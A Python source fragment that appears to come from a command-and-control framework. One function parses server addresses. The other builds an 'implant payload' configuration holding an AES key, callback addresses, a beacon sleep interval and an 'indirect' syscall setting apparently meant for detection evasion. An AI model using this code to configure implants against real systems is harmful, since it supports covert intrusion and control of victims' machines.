def parse_server(hp: str, protocol: str = "http") -> tuple[str, str, str, str]:
    # Splits a server address into host, port, origin and path
    """host, port, origin (scheme + host + port), path (leading slash, includes query)."""
    raw = str(hp or "").strip()
    if not raw:
        return "", "", "", "/"

    p = str(protocol or "http").strip().lower()
    if p not in ("http", "https"):
        p = "http"
    scheme = f"{p}://"

    body = raw
    if "://" in body:
        name, body = body.split("://", 1)
        if name.lower() in ("http", "https"):
            p = name.lower()
            scheme = f"{p}://"
        body = body.lstrip("/")

    authority = body.split("/", 1)[0].strip()
    path = "/"
    if "/" in body:
        rest = body.split("/", 1)[1]
        path = f"/{rest}" if rest else "/"

    if ":" in authority:
        host, port = (part.strip() for part in authority.rsplit(":", 1))
    else:
        host, port = authority, ""
    if not port:
        port = "443" if p == "https" else "80"

    origin = f"{scheme}{host}:{port}" if host else ""
    return host, port, origin, path


async def build_payload(config, aes_key):
    # Builds the implant payload from the servers and the aes key
    protocol = str(config.get("protocol", "http")).strip().lower()
    servers = config.get("servers") or {}
    keys = list(servers.keys())
    try:
        keys.sort(key=int)
    except (TypeError, ValueError):
        keys.sort()
    addresses = {}
    for k in keys:
        hp = str(servers[k]).strip()
        if not hp:
            continue
        _, _, origin, path = parse_server(hp, protocol)
        if origin:
            suffix = path if path.startswith("/") else f"/{path}"
            addresses[k] = f"{origin}{suffix}" if suffix != "/" else (
                origin if origin.endswith("/") else f"{origin}/"
            )

    return {
        "aes_key": aes_key,
        "channel": config.get("protocol", "http"),
        "host_tag": "",
        "addresses": addresses,
        "delay": str(config.get("sleep", "60")),
        "syscall_method": "indirect",
    }
